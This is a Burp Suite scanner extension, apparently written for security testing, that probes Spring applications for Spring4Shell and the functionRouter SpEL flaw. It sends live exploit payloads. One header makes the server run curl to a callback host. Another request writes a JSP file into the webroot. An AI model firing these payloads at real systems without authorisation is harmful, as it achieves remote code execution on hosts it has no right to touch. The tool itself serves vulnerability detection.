#
# S4S Scanner - Scanner for Spring4Shell
#
# Made with bare hands by Onur Osman Gule in 31-03-2022 for CVE-2022-22963
#
from burp import IBurpExtender, IScannerCheck, IScanIssue, IScannerInsertionPointProvider, IScannerInsertionPoint, IParameter
from java.io import PrintWriter
from java.net import URL
from java.util import ArrayList, Arrays, List

from org.python.core.util import StringUtil
from jarray import array

ghelpers = None
gcallbacks = None
paths = []

class BurpExtender(IBurpExtender, IScannerCheck):

    def registerExtenderCallbacks(self, callbacks):
        global gcallbacks, ghelpers
        self.callbacks = callbacks
        ghelpers = callbacks.getHelpers()
        callbacks.setExtensionName('S4S Scanner')
        gcallbacks = callbacks
        self.helpers = callbacks.getHelpers()
        self.collab = []
        callbacks.issueAlert('S4S Active and Passive Scanner is enabled.')
        stdout = PrintWriter(callbacks.getStdout(), True)
        stderr = PrintWriter(callbacks.getStderr(), True)
        callbacks.registerScannerCheck(self)

    def doPassiveScan(self, ihrr):
        print("pasif: "+ihrr.getUrl().toString())
        response = self.helpers.bytesToString(ihrr.getResponse())
        if "spring" in response or "Whitelabel Error Page" in response:
            issues = ArrayList()
            issues.add(pS4S(ihrr))
            return issues

        return None

    def doActiveScan(self, ihrr, isip):
        print(isip)
        issues = ArrayList()
        global paths
        collab = self.callbacks.createBurpCollaboratorClientContext()
        collab_payload =collab.generatePayload(True)
        last_payload = 's4s'
        (ignore, req) = setHeader(ihrr.getRequest(), 'Content-Length', str(len(last_payload)), True)
        (ignore, req) = setHeader(req, 'spring.cloud.function.routing-expression', 'T(java.lang.Runtime).getRuntime().exec("curl -i %s?wia=S4S_Scanner")'%collab_payload, True)
        org_path = ghelpers.analyzeRequest(ihrr).getUrl().getPath()
        last_slash = 0
        for i in range(len(org_path)):
            if org_path[i] == '/':
                last_slash = i
        attack_path = org_path[:last_slash]+'/'
        
        (req) = setBody(req,last_payload)
        (req) = setRequestTypeAndPath(req,'POST',attack_path+'functionRouter')
        
        if attack_path in paths:
            return None
        paths.append(attack_path)
        
        attack = gcallbacks.makeHttpRequest(ihrr.getHttpService(), req) 
        interactions = collab.fetchAllCollaboratorInteractions() 
        
        #check for CVE-2022-22965
        loc = run_exploit_22965(ihrr,attack_path,"ROOT","offsec")
        print("ok2")
        (ignore, req) = setHeader(ihrr.getRequest(), 'Content-Type', 'application/x-www-form-urlencoded', True)
        (req) = setRequestTypeAndPath(req,'GET',loc)
        attack_5 = gcallbacks.makeHttpRequest(ihrr.getHttpService(), req)
        response_5 = safe_bytes_to_string(attack_5.getResponse())
        print(response_5)
        print('s4s_scanner_006' in response_5)
        if 's4s_scanner_006' in response_5:
            issues.add(aS4S(ihrr, self.callbacks, self.helpers,5))
        if interactions:
            issues.add(aS4S(attack, self.callbacks, self.helpers,3))
        
        return issues if issues.size() > 0 else []
    
    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        return is_same_issue(existingIssue, newIssue)


class aS4S(IScanIssue):
    def __init__(self, reqres, callbacks, helpers, type):
        self.reqres = reqres
        self.callbacks = callbacks
        self.helpers = helpers
        self.type = type

    def getHost(self):
        return self.reqres.getHost()

    def getPort(self):
        return self.reqres.getPort()

    def getProtocol(self):
        return self.reqres.getProtocol()

    def getUrl(self):
        return self.reqres.getUrl()

    def getIssueName(self):
        if self.type == 5:
            return 'CVE-2022-22965 - Spring4Shell is Detected'
        else:
            return 'CVE-2022-22963 - functionRouter Shell is Detected'

    def getIssueType(self):
        return 0x00101000  # See http://portswigger.net/burp/help/scanner_issuetypes.html

    def getSeverity(self):
        return 'High'  # 'High', 'Medium', 'Low', 'Information' or 'False positive'

    def getConfidence(self):
        return 'Firm'  # 'Certain', 'Firm' or 'Tentative'

    def getIssueBackground(self):
        return str('The host is tested and may vulnerable for Spring4Shell.')

    def getRemediationBackground(self):
        return 'You should immediately check manual and research for fixes.'

    def getIssueDetail(self):
        return str('S4S Scanner has identified an Spring4Shell in:<b>'
                   '%s</b><br><br>' % (self.reqres.getUrl().toString()))

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        rra = [self.reqres]
        return rra

    def getHttpService(self):
        return self.reqres.getHttpService()
        
        
class pS4S(IScanIssue):
    def __init__(self, reqres):
        self.reqres = reqres

    def getHost(self):
        return self.reqres.getHost()

    def getPort(self):
        return self.reqres.getPort()

    def getProtocol(self):
        return self.reqres.getProtocol()

    def getUrl(self):
        return self.reqres.getUrl()

    def getIssueName(self):
        return "Spring Boot keyword is detected."

    def getIssueType(self):
        return 0x00101000  # See http:#portswigger.net/burp/help/scanner_issuetypes.html

    def getSeverity(self):
        return "Information"  # "High", "Medium", "Low", "Information" or "False positive"

    def getConfidence(self):
        return "Firm"  # "Certain", "Firm" or "Tentative"

    def getIssueBackground(self):
        return str("There is a spring boot keyword, maybe host is on Spring Boot that vulnerable for Spring4Shell. You should active scan with extension.")

    def getRemediationBackground(self):
        return "This is an <b>keyword</b> finding only.<br>"

    def getIssueDetail(self):
        return str("There is a spring boot keyword in this URL: <b>"
                      "%s</b><br><br>" % (self.reqres.getUrl().toString()))

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        rra = [self.reqres]
        return rra

    def getHttpService(self):
        return self.reqres.getHttpService()


def safe_bytes_to_string(bytes):
    if bytes is None:
        bytes = ''
    return ghelpers.bytesToString(bytes)
    
def setHeader(request, name, value, add_if_not_present=False):
    prev = ''
    i = 0
    while i < len(request):
        this = request[i]
        if prev == '\n' and this == '\n':
            break
        if prev == '\r' and this == '\n' and request[i - 2] == '\n':
            break
        prev = this
        i += 1
    body_start = i

    headers = safe_bytes_to_string(request[0:body_start])
    headers = headers.splitlines()
    modified = False
    for (i, header) in enumerate(headers):
        value_start = header.find(': ')
        header_name = header[0:value_start]
        if header_name == name:
            new_value = header_name + ': ' + value
            if new_value != headers[i]:
                headers[i] = new_value
                modified = True

    if modified:
        modified_request = ghelpers.stringToBytes('\r\n'.join(headers) + '\r\n') + request[body_start:]
    elif add_if_not_present:
        real_start = ghelpers.analyzeRequest(request).getBodyOffset()
        modified_request = request[:real_start-2] + ghelpers.stringToBytes(name + ': ' + value + '\r\n\r\n') + request[real_start:]
    else:
        modified_request = request

    return modified, modified_request
 
def setBody(request, value):
    prev = ''
    i = 0
    while i < len(request):
        this = request[i]
        if prev == '\n' and this == '\n':
            break
        if prev == '\r' and this == '\n' and request[i - 2] == '\n':
            break
        prev = this
        i += 1
    body_start = i
    
    real_start = ghelpers.analyzeRequest(request).getBodyOffset()
    modified_request = request[:real_start-2]+ request[real_start:]+ ghelpers.stringToBytes( '\r\n'+value) 
    
    return modified_request

def setRequestTypeAndPath(request, type ,path):
    # directly change to post functionRouter
    prev = ''
    i = 0
    while i < len(request):
        this = request[i]
        if prev == 13:
            break
        prev = this
        i += 1
    body_start = i
    print(str(body_start))
    
    real_start = ghelpers.analyzeRequest(request).getBodyOffset()
    modified_request = ghelpers.stringToBytes(type+' '+path+' HTTP/1.1')  + request[body_start:]
    
    return modified_request

def add_header_to_request(request, header_name, header_value):
    info = ghelpers.analyzeRequest(request)
    
    requestBodyOffset = info.getBodyOffset()
    requestHeaders = request[:requestBodyOffset].split('\r\n')
    requestBody = request[requestBodyOffset:]
    
    headerExists = len(filter( lambda x: header_name in x, requestHeaders )) > 0
    
    modifiedHeaders = ""
    
    if headerExists:
        modifiedHeaders = "\r\n".join([header if header_name not in header else header_name + header_value  for header in requestHeaders])
    else:
        modifiedHeaders = "\r\n".join([header if "Host: " not in header else header + "\r\n" + header_name + header_value  for header in requestHeaders])
    
    return modifiedHeaders + requestBody
 
def add_body_to_request(request, body):
    info = ghelpers.analyzeRequest(request)
    requestBodyOffset = info.getBodyOffset()
    requestHeaders = request[:requestBodyOffset]
    requestBody = request[requestBodyOffset:]
        
    h = ghelpers.stringToBytes(requestHeaders)
    b = ghelpers.stringToBytes(body)
    h.extend(b)
    
    return add_header_to_request(safe_bytes_to_string(h),"Content-Length: ",str(len(body)))

import time
def run_exploit_22965(breq,url, directory, filename):
    post_headers = {
    "Content-Type": "application/x-www-form-urlencoded"
    }
    
    file_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20out.println(%27s4s_scanner_006%27)%3B%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/"+directory+"&class.module.classLoader.resources.context.parent.pipeline.first.prefix="+filename+"&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    org_path = ghelpers.analyzeRequest(breq).getUrl().getPath()

    for i in range(3):
        (ignore, req) = setHeader(breq.getRequest(), 'Content-Type', 'application/x-www-form-urlencoded', True)
        (ignore, req) = setHeader(req, 'Content-Length', str(len(file_data)), True)
        (req) = setBody(req,file_data)
        (req) = setRequestTypeAndPath(req,'POST',org_path)
        attack = gcallbacks.makeHttpRequest(breq.getHttpService(), req)
        time.sleep(1)

    time.sleep(12)

    return "/" + filename + ".jsp"

    
def is_same_issue(existingIssue, newIssue):
    if existingIssue.getIssueName() == newIssue.getIssueName():
        return -1
    else:
        return 0
